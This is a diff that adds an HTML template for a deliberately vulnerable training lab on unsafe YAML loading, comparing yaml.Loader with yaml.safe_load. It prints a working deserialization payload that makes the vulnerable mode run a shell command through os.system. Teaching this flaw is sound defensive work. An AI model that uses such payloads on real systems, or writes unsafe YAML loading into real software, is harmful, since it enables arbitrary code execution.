@@ -1,0 +1,23 @@
+{% extends 'base.html' %}
+{% block title %}{{ lab.title }}{% endblock %}
+{% block content %}
+{% include 'shared_lab_header.html' %}
+<div class="workbench two-col wide-layout">
+  <section class="console-card">
+    <h2>YAML 加载（vuln 用 yaml.Loader / safe 用 safe_load）</h2>
+    <pre class="code-panel">PoC：粘贴下面这段 YAML 提交，vuln 模式会立刻执行 os.system：
+!!python/object/apply:os.system ["id > /tmp/pwned && cat /tmp/pwned"]
+
+safe：yaml.safe_load 直接抛 ConstructorError，拒绝任意 Python 构造器。</pre>
+    <form method="post" action="?mode={{ mode }}" class="form-grid">
+      <label>YAML
+        <textarea name="yaml_text" rows="6" style="width:100%; font-family:monospace">{{ raw }}</textarea>
+      </label>
+      <button class="button-primary" type="submit">解析</button>
+    </form>
+    {% if parsed_repr is not none %}<h3>parsed</h3><pre class="code-panel">{{ parsed_repr }}</pre>{% endif %}
+    {% if error %}<pre class="error-box">{{ error }}</pre>{% endif %}
+  </section>
+</div>
+{% include 'shared_hints.html' %}
+{% endblock %}
